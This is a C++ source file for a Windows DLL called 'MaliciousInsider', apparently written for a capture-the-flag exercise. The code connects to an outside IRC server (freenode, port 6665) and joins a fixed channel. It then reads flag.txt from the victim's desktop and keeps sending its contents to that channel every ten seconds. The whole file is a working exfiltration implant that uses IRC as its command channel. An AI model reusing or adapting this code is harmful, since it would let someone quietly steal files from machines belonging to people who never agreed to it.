// MaliciousInsider.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "MaliciousInsider.h"


MaliciousInsider::MaliciousInsider()
{
	OutputDebugString(L"Entering MaliciousInsider");

	ClientSocket = 0;
	clientService = { 0 };
	Connected = false;
	SurveyCompleted = false;
}

MaliciousInsider::~MaliciousInsider()
{
	OutputDebugString(L"Entering ~MaliciousInsider");

	if (ClientSocket != NULL)
	{
		//We make a best effort
		closesocket(ClientSocket);
	}
	WSACleanup();
}

MaliciousInsider::MISTATUS MaliciousInsider::Start()
{
	OutputDebugString(L"Entering Start");

	char			RecvBuf[MAXDATASIZE]	= { 0 };
	int				ByteCount				= 0;
	WSADATA			WSAData					= { 0 };
	sockaddr_in		ClientService			= { 0 };
	MISTATUS		TaskStatus				= MISTATUS_SUCCESS;
	int				Res						= 0;
	int				LoopCount				= 0;
	struct addrinfo	hints					= { 0 };
	struct addrinfo	*servinfo				= NULL;

	OutputDebugString(L"Setting up networking");
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM; 

	if (WSAStartup(MAKEWORD(2, 2), &WSAData) != NO_ERROR)
	{
		OutputDebugString(L"WSAStartup failed with" + WSAGetLastError());
		TaskStatus = MISTATUS_SOCKETERROR;
		goto cleanup;
	}

	if ((Res = getaddrinfo("wolfe.freenode.net", "6665", &hints, &servinfo)) != 0)
	{
		OutputDebugString(L"Error with getaddrinfo: " + Res); 
		TaskStatus = MISTATUS_SOCKETERROR;
		goto cleanup;
	}

	ClientSocket = socket(servinfo->ai_family, servinfo->ai_socktype, servinfo->ai_protocol);
	if (ClientSocket == INVALID_SOCKET){
		OutputDebugString(L"WSASTartup failed with " + WSAGetLastError());
		TaskStatus = MISTATUS_SOCKETERROR;
		goto cleanup;
	}

	if (connect(ClientSocket, servinfo->ai_addr, servinfo->ai_addrlen) == SOCKET_ERROR)
	{
		OutputDebugString(L"connect failed with " + WSAGetLastError());
		TaskStatus = MISTATUS_SOCKETERROR;
		goto cleanup;
	}

	OutputDebugString(L"Connecting...");
	while (RecvBuf != "")
	{
		switch (LoopCount)
		{
		case 0:
			SendData("CAP LS");
			SendData("NICK cylus");
			SendData("USER cylus_ 0 * :...");
			break;
		case 1:
			SendData("CAP REQ :multi-prefix");
			break;
		case 2:
			SendData("CAP END");
			break;
		case 3:
			SendData("USERHOST cylussec");
			break;
		case 4:
			SendData("JOIN #cylussec");
			break;
		case 5:
			SendData("MODE #cylussec");
			break;
		default:
			if ((SurveyCompleted == false))
			{
				TaskStatus = RunSurvey();
				if (TaskStatus != MISTATUS_SUCCESS)
				{
					OutputDebugString(L"RunSurvey failed with " + TaskStatus);
					TaskStatus = MISTATUS_SOCKETERROR;
					goto cleanup;
				}
				//I want to do this over and over just in case
				//SurveyCompleted = true;
				Sleep(10000);
			}
			break;
		}

		//Receive 
		ByteCount = recv(ClientSocket, RecvBuf, MAXDATASIZE - 1, 0);
		RecvBuf[ByteCount] = '\0';
		OutputDebugStringA("Received ");
		OutputDebugStringA(RecvBuf);

		ProcessMessage(RecvBuf);

		LoopCount++;
	}

cleanup:
	OutputDebugString(L"Exiting Start ");
	freeaddrinfo(servinfo);
	return TaskStatus;
}

MaliciousInsider::MISTATUS MaliciousInsider::SendData(string SendBuf)
{
	OutputDebugString(L"Entering SendData");
	OutputDebugStringA(SendBuf.c_str());
	
	MISTATUS TaskStatus = MISTATUS_SUCCESS;

	SendBuf.append("\r\n");

	if (send(ClientSocket, SendBuf.c_str(), SendBuf.length(), 0) == 0)
	{
		OutputDebugString(L"send failed with " + WSAGetLastError());
		TaskStatus = MISTATUS_SENDERROR;
		goto cleanup;
	}

cleanup:
	return TaskStatus;
}

MaliciousInsider::MISTATUS MaliciousInsider::SendPong(string RecvBuf)
{
	OutputDebugString(L"Entering SendPong");

	MISTATUS TaskStatus = MISTATUS_SUCCESS;

	typedef vector< string > split_vector_type;
	split_vector_type SplitVect;
	split(SplitVect, RecvBuf, is_any_of(" "));

	if (SplitVect[0] == "PING") 
	{
		TaskStatus = SendData(string("PONG ") + SplitVect[1]);
	}
	else
	{
		OutputDebugString(L"SendPong did not find PING");
		TaskStatus = MISTATUS_PINGERROR;
		goto cleanup;
	}

cleanup:
	return TaskStatus;
}

MaliciousInsider::MISTATUS MaliciousInsider::ProcessMessage(string RecvBuf)
{
	OutputDebugString(L"Entering ProcessMessage");

	MISTATUS TaskStatus = MISTATUS_SUCCESS;

	if (RecvBuf.find("PING") != string::npos)
	{
		//We need to process a ping message
		OutputDebugString(L"Processing PING");
		SendPong(RecvBuf);
	}
	else if (RecvBuf.find("/MOTD") != string::npos)
	{
		//We connected
		OutputDebugString(L"Processing PING");
		Connected = true;
	}
	else
	{
		OutputDebugString(L"No command processed for ");
		OutputDebugStringA(RecvBuf.c_str());
		goto cleanup;
	}

cleanup:
	return TaskStatus;
}

MaliciousInsider::MISTATUS MaliciousInsider::RunSurvey()
{
	OutputDebugString(L"Entering RunSurvey");

	MISTATUS	TaskStatus					= MISTATUS_SUCCESS;
	char		DesktopPath[MAXPATH + 1]	= { 0 };
	char		FileCollection[MAXDATA + 1]	= { 0 };
	string		IRCMessage; 
	fstream		FlagFile;

	if (SHGetSpecialFolderPathA(HWND_DESKTOP, DesktopPath, CSIDL_DESKTOPDIRECTORY, FALSE) == FALSE)
	{
		OutputDebugString(L"SHGetSpecialFolderPathA failed");
		TaskStatus = MISTATUS_SURVEYERROR;
		goto cleanup;
	}

	strncat_s(DesktopPath, "\\flag.txt", MAXPATH - strlen(DesktopPath));
	OutputDebugString(L"Collecting from ");
	OutputDebugStringA(DesktopPath);

	FlagFile.open(DesktopPath, fstream::in);

	if (FlagFile.fail())
	{
		OutputDebugString(L"Unable to open file ");
		OutputDebugStringA(DesktopPath);
		TaskStatus = MISTATUS_SURVEYERROR;
		goto cleanup;
	}

	FlagFile.read(FileCollection, MAXDATA);
	OutputDebugString(L"Sending: ");
	OutputDebugStringA(FileCollection);

	IRCMessage = string("PRIVMSG ") + IRCROOM + " :" + FileCollection;

	SendData(IRCMessage);
cleanup:
	return TaskStatus;
	
}